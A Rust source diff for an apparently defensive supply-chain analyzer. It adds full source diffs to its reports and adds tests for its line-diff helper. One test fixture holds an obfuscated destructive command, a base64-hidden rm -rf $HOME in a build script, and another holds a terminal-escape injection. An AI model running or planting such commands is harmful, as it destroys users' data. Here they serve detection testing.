@@ -132,15 +132,13 @@ fn line_diff(old: &[u8], new: &[u8]) -> String {
     let new_set: HashSet<&str> = new_text.lines().map(str::trim_end).collect();
 
     let mut s = String::new();
-    let mut shown = 0usize;
-    for line in new_text.lines() {
-        if shown >= MAX_LINES {
-            let _ = writeln!(s, "  … (diff truncated)");
-            break;
-        }
+    let new_lines: Vec<&str> = new_text.lines().collect();
+    for line in new_lines.iter().take(MAX_LINES) {
         let mark = if old_set.contains(line.trim_end()) { ' ' } else { '+' };
         let _ = writeln!(s, "{mark} {}", crate::printable(line));
-        shown += 1;
+    }
+    if new_lines.len() > MAX_LINES {
+        let _ = writeln!(s, "  … (diff truncated)");
     }
     for line in old_text
         .lines()
@@ -347,6 +345,12 @@ impl<'a> Analysis<'a> {
             // GitHub Action — is a supply-chain event worth surfacing on its
             // own, even when it stays below the gate.
             || self.assessment.structure.adds_external_code()
+            // A source file that gained behavior-bearing atoms below the finding
+            // floor (a `$HOME` read, a base64 heredoc) changed how it behaves
+            // even when no single trait rose to a finding. Say so — a silent
+            // verdict on a file that plainly gained obfuscation is the exact
+            // blind spot an atom-composed attack aims for.
+            || !self.observations().is_empty()
     }
 
     /// Whether to render the full report — grid, metrics, touched files, and
@@ -614,6 +618,34 @@ impl<'a> Analysis<'a> {
             let _ = writeln!(s, "\nchanged code / bytes (matched by rules):");
             s.push_str(ev.trim_end());
             s.push('\n');
+        }
+
+        // The full source diff for every changed source file — the payload's
+        // safety net. The sections above are what the rubric *matched*; a novel
+        // attack composed of innocent atoms matches nothing, so without this the
+        // model would be asked to judge a change it cannot see. Sub-Notable
+        // atoms are named first as reading hints, then the diff itself.
+        let changes = self.source_changes();
+        if !changes.is_empty() {
+            let _ = writeln!(
+                s,
+                "\nsource diffs (full text of every file whose behavior-bearing traits changed):"
+            );
+            for c in changes {
+                let hints: Vec<&str> = c
+                    .atoms
+                    .iter()
+                    .filter(|at| at.gained && !crate::rubric::is_finding(at.crit))
+                    .map(|at| at.desc.as_str())
+                    .filter(|d| !d.is_empty())
+                    .collect();
+                let _ = writeln!(s, "\n--- {} ---", c.label);
+                if !hints.is_empty() {
+                    let _ = writeln!(s, "(new sub-finding atoms: {})", hints.join("; "));
+                }
+                s.push_str(c.diff.trim_end());
+                s.push('\n');
+            }
         }
         s
     }
@@ -985,4 +1017,30 @@ fn skew_note(a: &Assessment, diff: &DiffReportV1) -> Option<String> {
             mean * 100.0,
         )
     })
+}
+
+#[cfg(test)]
+mod tests {
+    use super::line_diff;
+
+    #[test]
+    fn line_diff_marks_additions_removals_and_context() {
+        // gentoo-shaped edit: one line replaced, one added; the rest is context.
+        let old = b"#!/bin/bash\nexec meson build\n";
+        let new = b"#!/bin/bash\nmeson=`base64 -d <<< L2Jpbi9ybQo=`\nexec ${meson} -rf $HOME\n";
+        let d = line_diff(old, new);
+        // Context line is unmarked; both new lines are `+`; the replaced old
+        // line surfaces as `-`.
+        assert!(d.contains("  #!/bin/bash"), "context line kept: {d}");
+        assert!(d.contains("+ meson=`base64 -d <<< L2Jpbi9ybQo=`"), "added: {d}");
+        assert!(d.contains("+ exec ${meson} -rf $HOME"), "added: {d}");
+        assert!(d.contains("- exec meson build"), "removed: {d}");
+    }
+
+    #[test]
+    fn line_diff_neutralizes_control_chars() {
+        // A crafted line can't smuggle a terminal escape into the payload.
+        let d = line_diff(b"", b"evil\x1b[31mred\n");
+        assert!(!d.contains('\x1b'), "escape must be neutralized: {d:?}");
+    }
 }
